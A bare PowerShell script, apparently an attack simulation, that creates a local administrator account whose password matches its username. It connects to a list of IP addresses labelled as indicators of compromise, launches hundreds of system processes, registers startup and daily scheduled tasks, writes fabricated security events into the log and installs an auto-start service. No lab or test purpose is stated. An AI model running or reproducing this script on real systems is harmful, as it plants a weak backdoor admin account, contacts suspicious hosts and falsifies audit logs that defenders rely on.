New-LocalUser -Name "magadm" -Password (ConvertTo-SecureString -AsPlainText "magadm" -Force) -FullName "Admin Sync Account" -Description "Maintenance Admin User" -AccountNeverExpires | Out-Null
Add-LocalGroupMember -Group "Administrators" -Member "magadm"

$IoCs = @(
    "1.116.59.211", "1.179.247.182", "1.209.47.241", "101.204.24.28", 
    "101.206.168.120", "101.35.199.152", "101.71.37.47", "101.71.38.231", 
    "101.89.19.197", "101.93.86.68", "103.103.0.141", "103.103.0.142", 
    "103.107.198.109", "103.112.31.26", "103.13.220.57", "103.130.166.234", 
    "103.145.22.103", "103.149.162.116", "103.149.248.27", "103.194.184.98", 
    "103.232.136.12", "103.244.80.194"
)
foreach ($IoC in $IoCs) {
    try {
        $Client = New-Object System.Net.Sockets.TcpClient
        $Client.Connect($IoC, 80)
    } catch {}
    finally {
        $Client.Close()
    }
}

$Processes = @("svchost.exe", "cmd.exe", "powershell.exe", "wmic.exe", "explorer.exe", "notepad.exe", "msiexec.exe", "dism.exe")
for ($i = 0; $i -lt 100; $i++) {
    foreach ($Process in $Processes) {
        Start-Process $Process
    }
}

$Actions = @(
    New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c echo Maintenance Task 1",
    New-ScheduledTaskAction -Execute "cmd.exe" -Argument "/c echo Maintenance Task 2",
    New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-Command Write-Host 'Maintenance Task 3'",
    New-ScheduledTaskAction -Execute "notepad.exe"
)

$Triggers = @(
    New-ScheduledTaskTrigger -AtStartup,
    New-ScheduledTaskTrigger -Daily -At "02:00AM",
    New-ScheduledTaskTrigger -Daily -At "03:30PM"
)

$TaskNames = @("SystemSyncTask1", "SystemSyncTask2", "SystemSyncTask3", "SystemSyncTask4")

for ($i = 0; $i -lt $Actions.Count; $i++) {
    Register-ScheduledTask -TaskName $TaskNames[$i] -Action $Actions[$i] -Trigger $Triggers[$i % $Triggers.Count]
}

$EventSource = "Security"
$FakeLogs = @(
    "Account creation succeeded for user magadm",
    "A new process was created: svchost.exe",
    "Outbound connection established to 1.116.59.211"
)
foreach ($Message in $FakeLogs) {
    Write-EventLog -LogName "Application" -Source $EventSource -EventId 4624 -EntryType Information -Message $Message
}

sc.exe create "WindowsHelperSvc" binPath= "cmd.exe /c timeout /t 300" start= auto
Start-Service -Name "WindowsHelperSvc"
